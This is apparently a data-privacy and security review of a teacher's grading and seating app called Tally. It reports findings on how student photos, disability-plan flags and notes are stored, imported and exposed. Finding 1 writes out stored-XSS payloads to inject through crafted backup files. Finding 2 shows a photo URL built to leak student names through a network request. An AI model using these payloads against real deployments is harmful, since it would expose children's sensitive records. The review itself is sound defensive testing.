# Round 4 — district data-privacy / IT administrator review: the Seating surface

Reviewer lens: what Tally now stores about students (photos, FAST, ESE/504 flags and accommodation text, behavior
ratings, keep-apart notes), where it can go, and how far the two JSON import paths are trusted. Test build
(`python3 build.py --test`), Playwright/Chromium at 1400×900, the `tests/seating.js` setup (two course pools → period 1
accelerated / period 2 on-level, 24-desk Partners room). Every run had a `page.on('request')` listener; the numbers
below come from a synthetic v8 backup shaped like Croix's (7 periods, 91 students, 300×400 JPEG photos rendered in-page,
5.7 MB on disk). Harnesses are in my scratchpad (`admin1–4.js`, `setup.js`); nothing in the repo was changed.

Findings are ranked most severe first. Each has repro, what I saw, what I expected, and the responsible function.

---

## P0

### 1. Stored XSS through both JSON imports (v8 backup and Tally backup) — fires on every Seating render, survives reload
**Repro.** (a) v8 backup: set `layout.teacher.x` to `1"><img src=x onerror="…">`, a desk `id` to `q"><img …>`, or a
student's `level` to `</title><img src=x onerror="…">`; drop it on Tally with an empty room; open Seating. (b) Tally
backup (Settings → Load backup): same values in `room.teacher.x`, `room.desks[i].id`, `sections[k].seatInfo[name].level`,
and additionally `seatInfo[name].photo = 'x" onerror="…"'`. Open Seating, tap Generate, tap a desk, open the sheet,
open Room, reload.
**Saw.** Every payload executed: `teacher` on the first chart render, `deskid` and `level` on Generate / desk tap
(`<clipPath id="c<deskid>">`, `<title>FAST level …</title>`), `tb-photo-img` from the Students list `<img src>`. 54 hits
across one session; 4 more immediately after reload, because the payloads are persisted in `state.room` and
`sec.seatInfo`. Text fields (nick, plan, accom, notes, names, period names) did **not** fire — `esc()` is applied there.
**Expected.** Nothing from a file executes. The page runs from `file://` (or GitHub Pages) with full access to
`localStorage` — every roster, grade, photo and plan flag for 91 students — and, as finding 2 shows, can make network
requests; a crafted "backup" e-mailed to a teacher is a complete data-exfiltration vector.
**Responsible.** `seating.js` `svgChart` (teacher/door `translate(${t.x},${t.y})`, `id="${cid}"`/`url(#${cid})` from
`d.id`, `<title>FAST level ${s.level}</title>`, `<image href="${s.photo}">`), `svgRoom` (same teacher/door/desk id
sinks), `renderSeating` Students list and `movePanelHTML` / `openSeatSheet` (`<img src="${x.photo}">`), all unescaped;
`importSeatingBackup` (`teacher: L.teacher || null`, `door`, `String(d.id)`, `level: st.level || null` — no shape or
character checks) and `app.js` `#cfgFile.onchange` (`state.room = cfg.room`; `seatInfo: c.seatInfo` taken whole;
`roomOK()` numbers desks x/y/r but not `teacher`/`door` fields, and does not restrict id characters).

## P1

### 2. Photo fields make the page fetch arbitrary URLs — the "no network requests" guarantee is broken by a file
**Repro.** v8 backup with `students[0].photo = 'http://127.0.0.1:9/photo.jpg?exfil=' + name`; drop it. Then a Tally
backup with `seatInfo[name].photo = 'http://127.0.0.1:9/tb.jpg'`; load it; open Seating.
**Saw.** During the v8 import the page requested `http://127.0.0.1:9/photo.jpg?exfil=PRYOR%2C%20GREER`,
`https://example.invalid/p.jpg` and even attempted `javascript:…` (blocked by the browser). The Tally-backup photo is
stored **raw** (no re-encode) and then requested on every render — three requests in one Seating visit, and again after
reload. All other runs: zero non-file requests.
**Expected.** Only `data:image/*` strings are ever assigned to an `<img>`/`<image>`; anything else is dropped at import.
**Responsible.** `shrinkPhoto` (`img.src = dataUrl` for any string), `importSeatingBackup` (`if (st.photo)`), and the
Tally-backup `clean()` in `app.js` (`seatInfo` accepted unvalidated, so `photo` is neither checked nor shrunk).

### 3. A failed save is reported as a success — the chart / sheet edit is silently lost on reload
**Repro.** Fill `localStorage` to within ~100 KB of the quota (Chromium: ≈5.24 M chars for this origin), then (a) edit a
student's notes in the sheet and close it; (b) Generate → Save; (c) tap Project.
**Saw.** (a) toast "Could not save to this browser (**storage blocked**). Your data stays until you close the tab." —
the real cause is quota, and "until you close the tab" is not what happens (see below). (b) `save()` failed, then
`bindSeating`'s own toast **replaced** it: "Seating chart saved for 1st Period · Accelerated." After a reload
`sec.seating` was gone (`saved:false`). (c) `enterProjected` also failed to persist `hideNames = true`; after reload
`hideNames` was `false`.
**Expected.** A save failure is the last thing the teacher sees, names the quota, and the Save button doesn't claim
success. Headroom is fine today (≈500 KB for two classes incl. 47 photos; see "solid"), but Tally is the one place
these records live between backups.
**Responsible.** `app.js` `save()` (single generic message, no `QuotaExceededError` branch); `seating.js` `bindSeating`
`#seatSave` (`save(); render(); toast('… saved …')`), `enterProjected`.

### 4. Re-importing a per-section IXL file discards the class's seating data
**Repro.** Import `ixl_7T1A_scrubbed_*.csv`; set `seatInfo` (plan ESE, photo, FAST, keep-apart) and a saved chart on
that class; import the same file again.
**Saw.** `sec.seatInfo` and `sec.seating` are `undefined` afterwards — photos, ESE/504 flags, accommodations, FAST scores
and the saved chart are gone; no notice. Pool classes (Croix's current setup) refresh in place and keep them.
**Expected.** `SEATING_SPEC` says a chart "survives IXL and gradebook re-imports"; the README says per-section files
still work.
**Responsible.** `app.js` `importFiles` (`state.sections[meta.key] = { … }` rebuilds the section from `keep` and never
copies `seating` / `seatInfo`; `best`/`receipts` are carried, these aren't).

### 5. "Names off" does not mask every seating surface
All confirmed with Names off on the laptop view. Ordered by exposure:
- **(a) Import toast prints students' full names.** Dropping the v8 backup shows "… 65 not matched (FAKE47, STUDENT47;
  …)" for 9 s regardless of Names off. `renderNotices` masks the same kind of list; this toast doesn't.
  `app.js` `importFiles` (JSON branch).
- **(b) Student sheet shows the real first name and the nickname.** With Names off the header reads "G. P." but the
  "Goes by" input shows `value="Nicky0"` and `placeholder="Greer"` — the student's actual first name.
  `openSeatSheet` (`placeholder="${esc(titleCase(x.first))}"`, `value="${esc(info.nick)}"`).
- **(c) The last-move report keeps full names.** Swap two students with names on, toggle Names off: the panel still says
  "Swapped Bellamy Orme and Dakota Quill …" — `seatLast` caches rendered names. `seatMove` / `movePanelHTML`.
- **(d) Plan tags, FAST-level dots, behavior dots and accommodation text stay visible.** With Names off the chart still
  shows 17 ESE/504/E-5 tags and 30 level dots on desks, the Students list shows `ESE`/`504`/`H` chips, and why-here
  prints `ESE: <accommodation text>` (only the Notes line is hidden). Initials + a desk position + "504" identifies a
  child's plan status to anyone who can see a mirrored laptop or the tablet. The spec only promises initials and no
  photos, but the button's own tooltip says "hide them before projecting". `svgChart`, `renderSeating`, `whyHere`.

Masked correctly: chart names, list names, why-here partner/neighbor names, issues list, hover "if dropped here",
locked-seat toast, `aria-label`s, both print copies, and photos everywhere (0 `<img>`/`<image>` in chart, list, sheet,
why-here, prints).

## P2

### 6. Orphaned copies of photos / plan flags in `pendingCfg` — invisible, exported, never claimed
**Repro.** Save backup; Remove class period-2; Load backup; then re-create period 2 from its Focus gradebook.
**Saw.** The backup's period-2 block (24 photos, 18 plan flags, notes, chart) is parked in `state.pendingCfg['period-2']`
("1 waiting for their exports"), persisted to `localStorage`, and written into every later backup (`exportCfg` copies
`pendingCfg`). The re-created class has `seatInfo: {}` — `askNewClass` builds the section without reading `pendingCfg`
(only the per-section IXL path does). No screen lists `pendingCfg`; only Clear everything removes it.
**Expected.** Either the new class claims the parked data or the data is dropped with a notice; no silent second copy.
**Responsible.** `app.js` `#cfgFile.onchange` (`state.pendingCfg[k] = clean(c, null)`), `askNewClass` `#ncMake`,
`#exportCfg`.

### 7. No retention rule: seating data for students who left or were renamed is kept and exported forever
**Repro.** After the v8 import, remove a student from the roster (or rename them in the gradebook); open Seating; export.
**Saw.** `seatStudents` no longer lists them, but `sec.seatInfo[oldName]` (photo, plan, accommodation, notes,
keep-apart links naming other students) stays, and the backup carries it. Nothing prunes `seatInfo` against the roster;
a rename orphans one full record and starts a blank one.
**Expected.** Records follow the roster (prune or at least surface "N students no longer on the roster").
**Responsible.** `seatInfoOf` (create-only), roster/gradebook refresh paths in `app.js`.

### 8. The backup's disclosure line understates what it contains
**Saw.** Export toast: "it contains student names, weekly skill counts and computed Focus grades". The file now also
carries every photo, FAST level/percentile/scale score, ESE/504 flag, accommodation text, behavior rating, keep-apart
links and free-text notes (`seatInfo`), plain JSON, no encryption. The Settings label and the toast should say so, since
this file travels to Drive and between devices.
**Responsible.** `app.js` `#exportCfg`.

### 9. Corrupt storage → silent fresh start, sensitive blob left behind, overwritten on the next save
**Repro.** Truncate `localStorage['tally.v1']` by five characters; reload.
**Saw.** `load()` swallows the parse error and returns `null`; the app boots as if new (drop zone), the 500 KB corrupt
blob — photos, plan flags, notes — stays in `localStorage`, and the first `save()` overwrites it. The `.broken` copy
path only runs when `migrate()` throws, never for a parse error, so nothing is recoverable and nothing is shown.
**Responsible.** `app.js` `load()` / boot `catch`.

### 10. Malformed v8 files: raw JS errors in the toast and no rollback
**Saw.** `students: [null]` → toast "Cannot read properties of null (reading 'periodId')"; `periods: [null]` → "…reading
'sectionId'"; a `__proto__` period id → "byPer[st.periodId].push is not a function". A file that fails in the relations
pass (after the per-student loop) leaves every earlier student's `seatInfo` already overwritten in memory, unsaved,
then persisted by whatever `save()` comes next. Prototype pollution did **not** occur (`({}).polluted` stayed undefined).
**Responsible.** `importSeatingBackup` (no per-record validation, mutates `state` as it goes), `importFiles` catch.

## P3

### 11. Full names in DOM attributes under Names off
`data-sheet="<display>"` on 23 Students-list rows (and `data-lock`/`data-unseat`/`data-rel` when present) carry the
full `LAST, FIRST` id while the screen shows initials. Not visible, but a screen-share of devtools or a saved page is.
`renderSeating`, `movePanelHTML`, `openSeatSheet`.

### 12. Print fallback writes an unlabelled file with photos and plan tags to Downloads
With pop-ups blocked (Chromebox kiosk profiles often do), the teacher copy is saved as
`Seating_1st_Period_Accelerated.html` (54 KB, 23 photos, 17 plan tags) with only "saved as a file instead". When the
pop-up does open, the window stays open behind Tally with the same content. `printSeating`.

### 13. Weights and room fields accept junk from both imports
`weights: { behavior: '"><…', fill: '1e400' }` is stored as-is (`seatW` → NaN / Infinity); `roomOK()` does not numeric-
coerce `teacher`/`door`. Not a privacy issue on its own; it is the same missing validation as finding 1.

---

## What's solid

- **Size and quota.** Photos re-encode to ~1.5 KB each (47 photos → 72 KB; 91 ≈ 140 KB). Two classes with gradebooks,
  pools and photos = ~500 KB of `localStorage` against ≈5.2 M chars available. The 5.7 MB realistic v8 file imported in
  360 ms; a 36 MB one in 640 ms; parsing never blocked the UI. Non-image, `javascript:`, object and 3 MB photo values all
  become `null` via `shrinkPhoto` (the URL fetch in finding 2 aside).
- **Network.** Across all normal runs (setup, import, generate, swaps, sheet, prints, projected, backup): zero non-`file:`
  requests. Only attacker-supplied photo URLs produced any.
- **Projected screen.** Entering Race/Data Lab forces Names off, clears the toast, and re-renders: the hidden Seating DOM
  had 0 photos and 0 names; `#lb`, the Race, the Data Lab and the Overview contain no seating, plan, FAST or behavior
  text; toasts are suppressed in `lbMode`; exit lands on the Overview with names still hidden.
- **Prints.** Student/sub copy: names and photos only — 0 level/behavior circles, 0 plan tags, 0 locks, no notes or
  accommodation text; the teacher copy adds dots and plan tags but never notes or accommodation text. Both honour Names
  off (initials, no photos).
- **Deletion.** Clear everything empties `localStorage` (incl. `.broken`), `sessionStorage`, no IndexedDB. Remove class
  drops that class's `seatInfo` and chart from storage.
- **Escaping of text fields.** Names, nick, plan, accommodation, notes, period names, desk numbers, toast names: all
  through `esc()`; none of the text-field payloads fired. Keep-apart/seat-near links are remapped within the class only,
  so relations can't cross classes; `seatInfo` is per section, so same-name students in different courses don't collide;
  a v8 chart is only applied when its desk ids exist and the class has no chart.
- **Sheet privacy backdrop.** `openSeatSheet` uses the near-opaque `private` backdrop and dismisses the toast.
